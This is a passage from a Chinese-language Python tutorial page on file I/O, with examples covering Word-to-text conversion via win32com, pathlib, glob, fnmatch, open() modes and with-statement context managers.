    wordapp.ActiveDocument.SaveAs(os.path.abspath(txtfile), FileFormat=wdFormatTextLineBreaks)
    wordapp.ActiveDocument.Close()
    return txtfile

def next_doc():
    for d in glob.glob('*.doc'):
        yield d
    for d in glob.glob('*.docx'):
        yield d

def convert_and_zip(zipfilename):
    word = Dispatch("Word.Application")
    with ZipFile(zipfilename, 'w') as fzip:
        for doc in next_doc():
            print(f'converting {doc} ...')
            txtfile = convert_to_text(word, doc)
            if txtfile: fzip.write(txtfile)
    word.Quit()

</textarea>windows纯文本文档操作,pdf为什么乱码<textarea>
# -*- coding: UTF-8 -*-
import os
from win32com.client import Dispatch

filepath = "C:\\Users\\lenovo\\Desktop\\target\\test.docx"
savepath = os.path.splitext(filepath)[0] + '.txt'
wordapp = Dispatch('word.application')
wordtext = wordapp.Documents.Open(filepath)
wordtext.SaveAs(savepath, 4) # 提取文档的文本
wordtext.Close()

import sys;sys.exit()

</textarea>
</div>

<div id="io">
<h3>Python 文件I/O函数 IO编程</h3><pre>
【 同步异步 】
由于CPU和内存的速度远远高于外设的速度,所以在IO编程中就存在速度严重不匹配的问题,比如要把100M的数据写入磁盘,CPU输出100M的数据只需要0.01秒,可是磁盘要接收这100M数据可能需要10秒,怎么办呢？有两种办法:

第一种是CPU等着,也就是程序暂停执行后续代码,等100M的数据在10秒后写入磁盘,再接着往下执行,这种模式称为同步IO;
另一种方法是CPU不等待,只是告诉磁盘,"您老慢慢写,不着急,我接着干别的事去了",于是后续代码可以立刻接着执行,这种模式称为异步IO。

同步和异步的区别就在于是否等待IO执行的结果。好比去麦当劳点餐,你说"来个汉堡",服务员告诉你,对不起,汉堡要现做,需要等5分钟,于是你站在收银台前面等了5分钟,拿到汉堡再去逛商场,这是同步IO。
你说"来个汉堡",服务员告诉你,汉堡需要等5分钟,你可以先去逛商场,等做好了再通知你,这样你可以立刻去干别的事情(逛商场),这是异步IO。

使用异步IO来编写程序性能会远远高于同步IO,但是异步IO的缺点是编程模型复杂。想想看,你得知道什么时候通知你"汉堡做好了",而通知你的方法也各不相同。如果是服务员跑过来找到你,这是回调模式,如果服务员发短信通知你,你就得不停地检查手机,这是轮询模式。总之异步IO的复杂度远远高于同步IO。

操作IO的能力都是由操作系统提供的,每一种编程语言都会把操作系统提供的低级C接口封装起来方便使用,Python也不例外

以下的IO编程都是同步模式,异步IO由于复杂度太高,后续涉及到服务器端程序开发时再讨论

【 文件操作I/O 】
IO在计算机中指Input/Output即输入和输出。由于程序和运行时数据是在内存中驻留,由CPU这个超快的计算核心来执行,涉及到数据交换的地方,通常是磁盘、网络等,就需要IO接口

打开浏览器访问新浪首页,浏览器这个程序就需要通过网络IO获取新浪的网页。浏览器首先会发送数据给新浪服务器,告诉它想要首页的HTML,这个动作是往外发数据叫Output,随后新浪服务器把网页发过来,这个动作是从外面接收数据叫Input。所以通常程序完成IO操作会有Input和Output两个数据流。当然也有只用一个的情况,比如从磁盘读取文件到内存就只有Input操作,反过来把数据写到磁盘文件里就只是一个Output操作。

IO编程中Stream(流)是一个很重要的概念,Input Stream就是数据从外面(磁盘、网络)流进内存,Output Stream就是数据从内存流到外面去,浏览网页时浏览器和新浪服务器之间至少需要建立两根水管才可以既能发数据又能收数据。

文件I/O(输入/输出)是所有程序都必需的部分,使用输入机制允许程序读取外部数据(包括来自磁盘、光盘等存储设备的数据)和用户输入数据;使用输出机制允许程序记录运行状态,将程序数据输出到磁盘、光盘等存储设备中

Python提供有非常丰富的文件I/O支持,它既提供了pathlib和os.path来操作各种路径,也提供了全局的open()函数来打开文件,在打开文件之后程序既可读取文件的内容也可向文件输出内容,而且Python提供了多种方式来读取文件内容,因此非常简单、灵活

在Python的os模块下也包含了大量进行文件I/O的函数,使用这些函数来读取、写入文件也很方便,可以根据需要选择不同的方式来读写文件

Pyhon还提供了tempfile模块来创建临时文件和临时目录,tempfile模块下的高级API会自动管理临时文件的创建和删除;当程序不再使用临时文件和临时目录时,程序会自动删除临时文件和临时目录

【 File对象和OS对象 】
File对象方法: file对象提供了操作文件的一系列方法。
OS对象方法: 提供了处理文件及目录的一系列方法。

</pre><textarea>
import requests,os
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
print(__file__, BASE_DIR) # ./hello.py /mnt/e/wamp64/www/study/python

</textarea>

<h4>pathlib模块</h4><pre>
pathlib模块提供了一组面向对象的类,这些类可代表各种操作系统上的路径,程序可通过这些类操作路径

import pathlib
print([e for e in dir(pathlib) if not e.startswith('_')])
# ['EINVAL', 'ENOENT', 'ENOTDIR', 'Path', 'PosixPath', 'PurePath', 'PurePosixPath', 'PureWindowsPath', 'S_ISBLK', 'S_ISCHR', 'S_ISDIR', 'S_ISFIFO', 'S_ISLNK', 'S_ISREG', 'S_ISSOCK', 'Sequence', 'WindowsPath', 'attrgetter', 'contextmanager', 'fnmatch', 'functools', 'io', 'nt', 'ntpath', 'os', 'posixpath', 're', 'supports_symlinks', 'sys', 'urlquote_from_bytes']

PurePath代表并不访问实际文件系统的"纯路径",PurePath只是负责对路径字符串执行操作,至于该字符串是否对应实际的路径,它并不关心。
PurePath有两个子类即PurePosixPath和PureWindowsPath,分别代表UNIX风格的路径(包括 Mac OS X)和Windows风格的路径。
UNIX风格的路径和Windows风格路径的主要区别在于根路径和路径分隔符,UNIX风格路径的根路径是斜杠(/),而Windows风格路径的根路径是盘符(c:);UNIX风格的路径的分隔符是斜杠(/),而Windows风格路径的分隔符是反斜杠(\)

Path代表访问实际文件系统的"真正路径"。Path对象可用于判断对应的文件是否存在、是否为文件、是否为目录等。Path同样有两个子类:PosixPath和WindowsPath

【 PurePath的基本功能 】
程序可使用PurePath或它的两个子类来创建PurePath对象,如果在UNIX或Mac OS X系统上使用PurePath创建对象,程序实际返回PurePosixPath对象;如果在Windows系统上使用PurePath创建对象,程序实际返回PureWindowsPath对象。
如果程序明确希望创建PurePosixPath或PureWindowsPath对象,则应该直接使用PurePath的子类

</pre>程序在创建PurePath和Path时,既可传入单个路径字符串,也可传入多个路径字符串,PurePath会将它们拼接成一个字符串<textarea>
from pathlib import *

# 创建PurePath,实际上使用PureWindowsPath或PurePosixPath
pp = PurePath('test.py')
print(type(pp), pp)  # < class 'pathlib.PurePosixPath'> test.py

# PurePath的本质其实就是字符串,可使用str()将它们恢复成字符串对象,在恢复成字符串对象时会转换为对应平台风格的字符串
pp = PureWindowsPath('abc', 'xyz', 'wawa')
print(str(pp))       # abc\xyz\wawa
pp = PurePosixPath('abc', 'xyz', 'wawa')
print(str(pp))       # abc/xyz/wawa

pp = PurePath('crazyit', 'some/path', 'info')
# 看到输出Unix风格的路径
print(pp)            # 'crazyit/some/path/info'

pp = PurePath(Path('crazyit'), Path('info'))
# 看到输出Unix风格的路径
print(pp)            # 'crazyit/info'

# 明确指定创建PurePosixPath
pp = PureWindowsPath('crazyit', 'some/path', 'info')
# 看到输出Windows风格的路径
print(pp)            # crazyit\some\path\info

# 如果不传入参数,默认使用当前路径
pp = PurePath()
print(pp)            # .

# 如果传入参数包含多个根路径,则只有最后一个根路径及后面子路径生效
pp = PurePosixPath('/etc', '/usr', 'lib64')
print(pp)            # /usr/lib64
pp = PureWindowsPath('c:/Windows', 'd:info')
print(pp)            # d:info

# 在Windows风格路径中,只有盘符才算根路径,仅有斜杠是不算的
pp = PureWindowsPath('c:/Windows', '/Program Files')
print(pp)            # c:\Program Files

# 路径字符串中多出来的斜杠和点号(代表当前路径)都会被忽略,但不会忽略两点,因为两点在路径中代表上一级路径
pp = PurePath('crazyit//info')
print(pp)            # crazyit\info
pp = PurePath('crazyit/./info')
print(pp)            # crazyit\info
pp = PurePath('crazyit/../info')
print(pp)            # crazyit\..\info,相当于找和crazyit同一级的info路径

</textarea>PurePath对象的比较运算<pre>
from pathlib import *

# 比较两个Unix风格的路径,区分大小写
print(PurePosixPath('info') == PurePosixPath('INFO'))         # False
# 比较两个Windows风格的路径,不区分大小写
print(PureWindowsPath('info') == PureWindowsPath('INFO'))     # True
# Windows风格的路径不区分大小写
print(PureWindowsPath('INFO') in { PureWindowsPath('info') }) #True

# Unix风格的路径区分大小写,所以'D:'小于'c:'
print(PurePosixPath('D:') < PurePosixPath('c:'))              # True
# Windows风格的路径不区分大小写,所以'd:'(D:)大于'c:'
print(PureWindowsPath('D:') > PureWindowsPath('c:'))          #True

# 对于不同风格的PurePath,它们依然可以比较是否相等,结果总是返回False,但不能比较大小,否则会引发错误
# 不同风格的路径可以判断是否相等(总不相等)
print(PureWindowsPath('crazyit') == PurePosixPath('crazyit')) # False
# 不同风格的路径不能判断大小,否则会引发异常
#print(PureWindowsPath('info') < PurePosixPath('info'))       # TypeError

</pre>PurePath对象支持斜杠/作为运算符,该运算符的作用是将多个路径连接起来。不管是UNIX风格的路径还是Windows风格的路径都是使用斜杠作为连接运算符的<textarea>
pp = PureWindowsPath('abc')
# 将多个路径拼起来(Windows风格的路径)
print(pp / 'xyz' / 'wawa') # abc\xyz\wawa

pp = PurePosixPath('abc')
# 将多个路径拼起来(Unix风格的路径)
print(pp / 'xyz' / 'wawa') # abc/xyz/wawa

pp2 = PurePosixPath('haha', 'hehe')
# 将pp、pp2两个路径连接起来
print(pp / pp2) # abc/haha/hehe

</textarea><pre>
【 PurePath的属性和方法 】
PurePath提供了不少属性和方法,这些属性和方法主要还是用于操作路径字符串。由于PurePath并不真正执行底层的文件操作,也不理会路径字符串在底层是否有对应的路径,因此这些操作有点类似于字符串方法

</pre><textarea>
from pathlib import *

# PurePath.parts:该属性返回路径字符串中所包含的各部分
print(PurePath('/mnt/e/wamp64/www/study/python/hello.py').parts)
# ('/', 'mnt', 'e', 'wamp64', 'www', 'study', 'python', 'hello.py')

# PurePath.is_absolute():判断当前路径是否为绝对路径
print(PurePath('/mnt/e/wamp64/www/study/python/hello.py').is_absolute()) # True
print(PurePath().is_absolute())  # False

# PurePath.joinpath(*other):将多个路径连接在一起,作用类似于斜杠运算符
print(PurePath('/mnt/e/wamp64/www/study/python').joinpath('hello.py'))
# /mnt/e/wamp64/www/study/python/hello.py

# 访问drive属性,返回路径字符串中的驱动器盘符
print(PureWindowsPath('c:/Program Files/').drive) # c:
print(PureWindowsPath('/Program Files/').drive)   # ''
print(PurePosixPath('/etc').drive)                # ''

# 访问root属性,返回路径字符串中的根路径
print(PureWindowsPath('c:/Program Files/').root)  # \
print(PureWindowsPath('c:Program Files/').root)   # ''
print(PurePosixPath('/etc').root)                 # /

# 访问anchor属性,返回路径字符串中的盘符和根路径
print(PureWindowsPath('c:/Program Files/').anchor)# c:\
print(PureWindowsPath('c:Program Files/').anchor) # c:
print(PurePosixPath('/etc').anchor)               # /

# 访问parents属性,返回当前路径的全部父路径
pp = PurePath('abc/xyz/wawa/haha')
print(pp.parents)       # < PurePosixPath.parents>
print(pp.parents[0])    # abc\xyz\wawa
print(pp.parents[1])    # abc\xyz
print(pp.parents[2])    # abc
print(pp.parents[3])    # .

# 访问parent属性,返回当前路径的上一级路径,相当于parents[0]的返回值
print(pp.parent)        # abc\xyz\wawa

# 访问name属性,返回当前路径中的文件名
print(pp.name)          # haha
pp = PurePath('abc/wawa/bb.txt')
print(pp.name)          # bb.txt

# 访问suffixes属性,返回当前路径中的文件所有后缀名
pp = PurePath('abc/wawa/bb.txt.tar.zip')
print(pp.suffixes[0]) # .txt
print(pp.suffixes[1]) # .tar
print(pp.suffixes[2]) # .zip

# 访问suffix属性,返回当前路径中的文件后缀名,相当于suffixes属性返回的列表的最后一个元素
print(pp.suffix)      # .zip

# 访问stem属性,返回当前路径中的主文件名
print(pp.stem)        # bb.txt.tar

pp = PurePath('abc', 'xyz', 'wawa', 'haha')
print(pp)             # abc\xyz\wawa\haha

# PurePath.as_posix():将当前路径转换成UNIX风格的路径
print(pp.as_posix())  # abc/xyz/wawa/haha

# 将当前路径转换成URI,只有绝对路径才能转换,否则将会引发ValueError
#print(pp.as_uri())   # ValueError
# 创建绝对路径
pp = PurePath('d:/', 'Python', 'Python3.6')
# 将绝对路径转换成Uri
print(pp.as_uri())    # file:///d:/Python/Python3.6

# PurePath.match(pattern):判断当前路径是否匹配指定模式
print(PurePath('a/b.py').match('*.py'))      # True
print(PurePath('/a/b/c.py').match('b/*.py')) # True
print(PurePath('/a/b/c.py').match('a/*.py')) # False

# PurePath.relative_to(*other):获取当前路径中去除基准路径之后的结果
pp = PurePosixPath('c:/abc/xyz/wawa')
print(pp.relative_to('c:/'))         # abc\xyz\wawa
print(pp.relative_to('c:/abc'))      # xyz\wawa
print(pp.relative_to('c:/abc/xyz'))  # wawa

# PurePath.with_name(name):将当前路径中的文件名替换成新文件名。如果当前路径中没有文件名则会引发ValueError
p = PureWindowsPath('e:/Downloads/pathlib.tar.gz')
print(p.with_name('fkit.py'))        # e:\Downloads\fkit.py
p = PureWindowsPath('c:/')
#print(p.with_name('fkit.py'))       # ValueError

# PurePath.with_suffix(suffix):将当前路径中的文件后缀名替换成新的后缀名。如果当前路径中没有后缀名则会添加新的后缀名
p = PureWindowsPath('e:/Downloads/pathlib.tar.gz')
print(p.with_suffix('.zip'))         # e:\Downloads\pathlib.tar.zip
p = PureWindowsPath('README')
print(p.with_suffix('.txt'))         # README.txt

</textarea><pre>
【 Path的功能和用法 】
Path是PurePath的子类,它除支持PurePath的各种操作、属性和方法之外,还会真正访问底层的文件系统,包括判断Path对应的路径是否存在,获取Path对应路径的各种属性(如是否只读、是文件还是文件夹等),甚至可以对文件进行读写

PurePath和Path最根本的区别在于,PurePath的本质依然是字符串,而Path则会真正访问底层的文件路径,因此它提供了属性和方法来访问底层的文件系统

Path同样提供了两个子类,PosixPath和 WindowsPath,其中前者代表UNIX风格的路径,后者代表Windows风格的路径。

Path对象包含了大量is_xxx()方法,用于判断该Path对应的路径是否为xxx。

Path.exists()用于判断该Path对应的目录是否存在
Path.iterdir()返回Path对应目录下的所有子目录和文件
Path.glob()用于获取Path对应目录及其子目录下匹配指定模式的所有文件,借助于glob()方法,可以非常方便地查找指定文件
Path.read_bytes()和Path.read_text(encoding=None, errors=None)分别用于读取该Path对应文件的字节数据(二进制数据)和文本数据
Path.write_bytes(data)和Path.write_text(data, encoding=None, errors=None)分别用于输出字节数据(二进制数据)和文本数据

</pre><textarea>
from pathlib import *

# 获取当前目录
p = Path('.')
# 遍历当前目录下所有文件和子目录
for x in p.iterdir():
    print(x)

# 获取上一级目录
p = Path('../')
# 获取上级目录及其所有子目录下的的py文件
for x in p.glob('**/*.py'):
    print(x)

# 获取g:/publish/codes对应的目录
p = Path('g:/publish/codes')
# 获取上级目录及其所有子目录下的的py文件
for x in p.glob('**/Path_test1.py'):
    print(x)

'''
输出:
Path_test1.py
PurePath_test1.py
PurePath_test2.py
PurePath_test3.py

..\12.1\Path_test1.py
..\12.1\PurePath_test1.py
..\12.1\PurePath_test2.py
..\12.1\PurePath_test3.py

g:\publish\codes\12\12.1\path_test1.py
'''

p = Path('a_test.txt')
# 以GBK字符集输出文本内容
result = p.write_text('''有一个美丽的新世界
它在远方等我
那里有天真的孩子
还有姑娘的酒窝''',  encoding='GBK')
# 返回输出的字符数
print(result)

# 指定以GBK字符集读取文本内容
content = p.read_text(encoding='GBK')
# 输出读取的文本内容
print(content)

# 读取字节内容
bb = p.read_bytes()
print(bb)

</textarea>

<h4>glob模块</h4><pre>
glob模块提供了一个函数用于从目录通配符搜索中生成文件列表:
import glob
print(glob.glob('*.py'))  # ['primes.py', 'random.py', 'quote.py']
print(glob.glob('**/*.py', recursive=True))

第一个参数指定目标文件的文件名格式,这里可以使用Linux中的通配符。*.py是当前文件夹下面的所有.py文件,**/*.py是当前第一层子文件夹下面的所有.py文件。文件名为**/*.py并且增加参数recursive=True就是递归搜索当前文件夹和所有子文件夹。

</pre>

<h4>fnmatch模块:filename match 用于文件名的匹配</h4><pre>
那些操作目录的函数只能进行简单的模式匹配,但fnmatch模块可以支持类似于UNIX shell风格的文件名匹配

nmatch匹配支持如下通配符:
*:可匹配任意个任意字符。
？:可匹配一个任意字符。
[字符序列]:可匹配中括号里字符序列中的任意字符。该字符序列也支持中画线表示法。比如[a-c]可代表a、b 和 c 字符中任意一个。
[!字符序列]:可匹配不在中括号里字符序列中的任意字符。

fnmatch.fnmatch(filename, pattern)
判断指定文件名是否匹配指定pattern

fnmatch.fnmatch(filename, '*.doc')
fnmatch.fnmatch(filename, '*.docx')

</pre><textarea>
from pathlib import *
import fnmatch
# 遍历当前目录下所有文件和子目录
for file in Path('.').iterdir():
    # 访问所有以_test.py结尾的文件
    if fnmatch.fnmatch(file, '*_test.PY'):
        print(file)

</textarea><pre>
fnmatch.fnmatchcase(filename, pattern)
该函数与fnmatch函数的功能大致相同,只是该函数区分大小写。

fnmatch.filter(names, pattern)
该函数对names列表进行过滤,返回names列表中匹配pattern的文件名组成的子集合

</pre>fnmatch模块并不关心实际上文件是否存在<textarea>
names = ['a.py', 'b.py', 'c.py', 'd.py']
sub = fnmatch.filter(names, '[ac].py')
print(sub) # ['a.py', 'c.py']

</textarea><pre>
fnmatch.translate(pattern)
该函数用于将一个UNIX shell风格的pattern转换为正则表达式pattern

print(fnmatch.translate('?.py'))     # (?s:.\.py)\Z
print(fnmatch.translate('[ac].py'))  # (?s:[ac]\.py)\Z
print(fnmatch.translate('[a-c].py')) # (?s:[a-c]\.py)\Z

</pre>

<h4>文件读写</h4><pre>
读写文件是最常见的IO操作,Python内置了读写文件的函数,用法和C是兼容的。
在磁盘上读写文件的功能都是由操作系统提供的,现代操作系统不允许普通的程序直接操作磁盘,所以读写文件就是请求操作系统打开一个文件对象(通常称为文件描述符),然后通过操作系统提供的接口从这个文件对象中读取数据(读文件)或把数据写入这个文件对象(写文件)

Python提供了必要的函数和方法进行默认情况下的文件基本操作,可以用file对象做大部分的文件操作。

【 open函数:打开指定的文件 】
必须先用Python内置的open()函数打开一个文件,创建一个file对象,相关的方法才可以调用它进行读写,在对文件进行处理过程都需要使用到这个函数,如果该文件无法被打开会抛出OSError

fileObject = open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)
用读模式打开不存在的文件open()会抛出IOError的错误
file_name:包含了要访问的文件名称的字符串值,相对或绝对路径,只有这个参数是必须的
access_mode:打开文件的模式,默认r只读
buffering:值为0就不会有寄存,值取1则访问文件时会寄存行,值设为大于1的整数表明了这就是的寄存区的缓冲大小,取负值则寄存区的缓冲大小为系统默认
encoding: 一般使用utf8
errors: 报错级别
newline: 区分换行符
closefd: 传入的file参数类型
opener:

文件访问模式:
r   (默认)只读模式,文件的指针将会放在文件的开头
w   写模式,文件已存在则打开文件并从开头开始编辑即原有内容会被删除,文件不存在则创建新文件
a   追加模式,文件已存在则文件指针将会放在文件结尾,新内容将会被写入到已有内容之后,文件不存在则创建新文件进行写入
b   二进制模式,可与其他模式结合使用。比如rb代表二进制只读模式,rb+代表二进制读写模式,ab代表二进制追加模式
+   读写模式(可读可写),可与其他模式结合使用。比如r+代表读写模式,w+也代表读写模式
t   (默认)文本模式
x   写模式,新建一个文件,如果该文件已存在则会报错。
rb+ 以二进制格式打开一个文件用于读写,文件指针将会放在文件的开头,一般用于非文本文件如图片等。

w只代表写模式,w+则代表读写模式,但实际上它们的差别并不大。因为不管是w还是w+模式打开指定文件时open()都会立即清空文件内容,实际上都无法读取文件内容,所以如果希望调用open()函数打开指定文件后该文件中的内容能被保留下来,那么程序就不能使用w或w+模式

如果程序使用r或r+模式打开文件则要求被打开的文件本身是存在的,使用r或r+模式都不能创建文件。但使用w、w+、a、a+模式打开文件则该文件可以是不存在的,open()函数会自动创建新文件。

b模式可被迫加到其他模式上,用于代表以二进制的方式来读写文件内容。计算机中文本文件只有很少的一部分,大部分文件其实都是二进制文件,包括图片文件、音频文件、视频文件等,如果使用文本方式来操作二进制文件,则往往无法得到正确的文件内容,比如强行以文本方式打开一个音频文件必会出现乱码。因此如果程序需要读写文本文件以外的其他文件则都应该添加b模式

通常文件是以text mode打开的,这意味着从文件中读取或写入字符串时都会以指定的编码方式进行编码。如果未指定编码格式则默认值与平台相关。在mode中追加的'b'则以binary mode打开文件:现在数据是以字节对象的形式进行读写的。这个模式应该用于所有不包含文本的文件

在文本模式下读取时默认会把平台特定的行结束符 (Unix上的\n, Windows上的\r\n) 转换为\n。在文本模式下写入时默认会把出现的\n转换回平台特定的结束符。这样在幕后修改文件数据对文本文件来说没有问题,但会破坏二进制数据例如JPEG或EXE文件中的数据。请一定要注意在读写此类文件时应使用二进制模式

以r+、w、w+、a、a+模式打开文件则都可以写入,当以r+、w、w+模式打开文件时文件指针位于文件开头处;当以a、a+模式打开文件时,文件指针位于文件结尾处,当以w或w+模式打开文件时程序会立即清空文件的内容

缓冲
计算机外设如硬盘、网络的I/O速度远远低于访问内存的速度,而程序执行I/O时要么将内存中的数据写入外设,要么将外设中的数据读取到内存,如果不使用缓冲,程序必须等待外设进行同步读写,就必须等外设输入或输出一个字节后内存中的程序才能输出或输入一个字节,这意味着内存中的程序大部分时间都处于等待状态
因此一般建议打开缓冲。在打开缓冲之后,当程序执行输出时程序会先将数据输出到缓冲区中,而不用等待外设同步输出,当程序把所有数据都输出到缓冲区中之后,程序就可以去干其他事情了,留着缓冲区慢慢同步到外设即可;当程序执行输入时程序会先等外设将数据读入缓冲区中,而不用等待外设同步输入。
open()第三个参数是0或False时该函数打开的文件就是不带缓冲的;如果其第三个参数是1或True则该函数打开的文件就是带缓冲的,此时程序执行I/O将具有更好的性能。如果其第三个参数是大于1的整数则该整数用于指定缓冲区的大小,单位是字节,如果其第三个参数为任何负数则代表使用默认的缓冲区大小。

</pre>文件读写时都有可能产生IOError,一旦出错后面的f.close()就不会调用,所以为保证无论是否出错都能正确地关闭文件,可以使用try ... finally来实现<textarea>
try:
    f = open('/path/to/file', 'r')
    print(f.read())
finally:
    if f:
        f.close()

</textarea><pre>
【 with用法 】
每次主动关闭文件的方式太繁琐,Python提供了with语句来管理资源关闭。比如可以把打开的文件放在with语句中,这样with语句就会自动调用close()方法关闭文件,因此它们都不需要显式关闭文件,这和try...finally一样,但代码更佳简洁

with语句的语法格式如下,context_expression用于创建可自动关闭的资源
with context_expression [as target(s)]:
    pass

</pre>使用with语句打开文件,该语句会负责关闭文件<textarea>
with open('/path/to/file', 'r') as f:
    print(f.read())
print(f.closed)  # True

import codecs
with codecs.open("readlines_test.py", 'r', 'utf-8', buffering=True) as f:
    for line in f:
        print(line, end='')

import fileinput
with fileinput.input(files=('test.txt', 'info.txt')) as f:
    for line in f:
        print(line, end='')

</textarea><textarea>
# 默认都是读取UTF-8编码的文本文件,要读取二进制文件,比如图片、视频等等,用'rb'模式打开文件即可
with open('/Users/michael/test.jpg', 'rb') as f:
    print(f.read())  # b'\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...' # 十六进制表示的字节

# 读取GBK编码的文件
with open('/Users/michael/gbk.txt', 'r', encoding='gbk') as f:
    print(f.read())

# 遇到有些编码不规范的文件,可能会遇到UnicodeDecodeError,因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况,open()函数还接收一个errors参数,表示如果遇到编码错误后如何处理。最简单的方式是直接忽略:
with open('/Users/michael/gbk.txt', 'r', encoding='gbk', errors='ignore') as f:
    print(f.read())

</textarea><pre>
当使用open()函数打开文本文件时,程序总是使用当前操作系统的字符集,比如Windows平台open()函数总是使用GBK字符集,因此程序读取的文件也必须使用GBK字符集保存,否则程序就会出现UnicodeDecodeError错误

</pre>打开文本文件和二进制文件<textarea>
# r模式读取文本文件内容为str类型
with open('test.txt', 'r') as f:
    print(type(f.read()))   # < class 'str'>

# r模式读取文本文件内容为str类型
with open('test.py', 'r') as f:
    print(type(f.read()))   # < class 'str'>

# r模式读取二进制文件内容报错
with open('dog.jpg', 'r') as f:
    print(type(f.read()))   # UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte

# rb模式读取二进制文件内容为bytes类型
with open('dog.jpg', 'rb') as f:
    print(type(f.read()))            # < class 'bytes'>
    print(f.read().decode('UTF-8'))  # None

# rb模式读取文本文件内容为bytes类型
with open('test.py', 'rb') as f:
    print(type(f.read()))            # < class 'bytes'>

</textarea><pre>
如果要读取的文件所使用的字符集和当前操作系统的字符集不匹配,则有两种解决方式:
1、使用二进制模式读取,然后用bytes的decode()方法恢复成字符串。
2、利用codecs模块的open()函数来打开文件,该函数在打开文件时允许指定字符集。

</pre><textarea>
# 使用二进制模式读取文本文件内容,此时文件对象的read()方法返回bytes对象,程序可调用bytes对象的decode()方法将它恢复成字符串
f = open("read_test3.py", 'rb', True)
# 直接读取全部文件,并调用bytes的decode将字节内容恢复成字符串,由于此时读取的read_test3.py文件是以UTF-8的格式保存的,因此程序需要使用decode()方法恢复字符串时显式指定使用UTF-8字符集
print(f.read().decode('utf-8'))
f.close()

# 使用codes模块的open()函数来打开文件,此时可以显式指定使用utf-8字符集读取文件内容
import codecs
f = codecs.open("read_test4.py", 'r', 'utf-8', buffering=True)
while True:
    ch = f.read(1)       # 每次读取一个字符
    if not ch : break    # 如果没有读取到数据,则跳出循环
    print (ch, end='')
f.close()

</textarea><pre>
with语句的实现原理
使用with语句管理的资源必须是一个实现上下文管理协议(context manage protocol)的类,这个类的对象可被称为上下文管理器。
要实现上下文管理协议则必须实现如下两个方法:
1、context_manager.__enter__():进入上下文管理器自动调用的方法,该方法会在with代码块执行之前执行。如果with语句有as子句,那么该方法的返回值会被赋值给as子句后的变量;该方法可以返回多个值,因此在as子句后面也可以指定多个变量,多个变量必须由"()"括起来组成元组
2、context_manager.__exit__(exc_type, exc_value, exc_traceback):退出上下文管理器自动调用的方法,该方法会在with代码块执行之后执行。如果with代码块成功执行结束,程序自动调用该方法,调用该方法的三个参数都为None:如果with代码块因为异常而中止,程序也自动调用该方法,使用sys.exc_info得到的异常信息将作为调用该方法的参数。

只要一个类实现了__enter__()和__exit__(exc_type, exc_value, exc_traceback)方法,程序就可以使用with语句来管理它;通过 __exit__() 方法的参数即可判断出with代码块执行时是否遇到了异常。

换而言之,文件对象、FileInput对象,其实都实现了这两个方法,因此它们都可以接受with语句的管理

</pre>自定义一个实现上下文管理协议的类,并使用with语句来管理它<textarea>
class FkResource:
    def __init__(self, tag):
        self.tag = tag
        print('构造器,初始化资源: %s' % tag)

    # 定义__enter__方法,with体之前的执行的方法
    def __enter__(self):
        print('[__enter__ %s]: ' % self.tag)
        return 'fkit'     # 该返回值将作为as子句中变量的值,可以返回任意类型的值

    # 定义__exit__方法,with体之后的执行的方法
    def __exit__(self, exc_type, exc_value, exc_traceback):
        print('[__exit__ %s]: ' % self.tag)
        if exc_traceback is None:
            print('没有异常时关闭资源')
        else:
            print('遇到异常时关闭资源')
            return False   # 可以省略,默认返回None也被看做是False

with FkResource('孙悟空') as dr:
    print(dr)
    print('[with代码块] 没有异常')
print('------------------------------')
with FkResource('白骨精'):
    print('[with代码块] 异常之前的代码')
    raise Exception
    print('[with代码块] ~~~~~~~~异常之后的代码')

'''
上面程序定义了一个FkResource类,该类定义了__enter__()和__exit__()两个方法,因此该类的对象可以被with语句管理:
程序在执行with代码块之前会执行__enter__()方法,并将该方法的返回值赋值给as子句后的变量。
程序在执行with代码块之后会执行__exit__()方法,可以根据该方法的参数来判断with代码块是否有异常。

程序两次使用with语句管理 FkResource对象。第一次with代码块没有出现异常。第二次with代码块出现了异常。大家可以看到,使用with语句两次对FkResource的管理略有差异(主要是在__exit()__方法中略有差异)。

运行上面的程序,可以看到如下输出结果:
构造器,初始化资源: 孙悟空
[__enter__ 孙悟空]:
fkit
[with代码块] 没有异常
[__exit__ 孙悟空]:
没有异常时关闭资源
------------------------------
构造器,初始化资源: 白骨精
[__enter__ 白骨精]:
[with代码块] 异常之前的代码
[__exit__ 白骨精]:
遇到异常时关闭资源
Traceback (most recent call last):
  File "C:\Users\mengma\Desktop\1.py", line 26, in < module>
    raise Exception
Exception

从上面的输出结果来看,使用 with 语句管理资源,程序总可以在进入 with 代码块之前自动执行 __enter__() 方法,无论 with 代码块是否有异常,这个部分都是一样的,而且 __enter__() 方法的返回值被赋值给了 as 子句后的变量,如上面的 ① 号输出信息所示。

对于 with 代码块有异常和无异常这两种情况,此时主要通过 exit() 方法的参数进行判断,程序可针对 with 代码块是否有异常分别进行处理,如程序中代码所示。
'''

</textarea><pre>
【 file-like Object 】
像open()函数返回的这种有个read()方法的对象在Python中统称为file-like Object。Python的很多I/O流都是类文件对象,除了file外,还可以是内存的字节流、网络流、自定义流等。file-like Object不要求从特定类继承,只要写个read()方法就行。

StringIO就是在内存中创建的file-like Object,常用作临时缓冲

</pre>文件对象本身就是可遍历的,因此程序完全可以使用for循环来遍历读取文件内容<textarea>
import codecs
# 指定使用utf-8字符集读取文件内容
f = codecs.open("for_file.py", 'r', 'utf-8', buffering=True)
# 使用for循环遍历文件对象
for line in f:
    print(line, end='')
f.close()

# 也可以使用list()函数将文件对象转换成list列表,就像文件对象的readlines()方法的返回值一样
print(list(codecs.open("for_file.py", 'r', 'utf-8', buffering=True)))

# sys.stdin也是一个类文件对象,因此程序同样可以使用for循环遍历sys.stdin,这意味着程序可以通过for循环来遍历获取用户的键盘输入,即用户每输入一行,程序就会输出用户输入的这行
import sys
for line in sys.stdin: print('用户输入:', line, end='')

</textarea>【 File对象的属性 】<textarea>
# 以默认方式打开文件
f = open('test.py')
# 访问文件的编码方式
print(f.encoding)  # UTF-8
# 访问文件的访问模式
print(f.mode)      # r
# 访问文件是否已经关闭
print(f.closed)    # False
# 访问文件对象打开的文件名
print(f.name)      # test.py

</textarea><pre>
【 file对象的方法 】
file.close()
关闭文件,关闭后文件不能再进行读写操作,文件使用完毕后必须关闭,因为文件对象会占用操作系统的资源,并且操作系统同一时间能打开的文件数量也是有限的
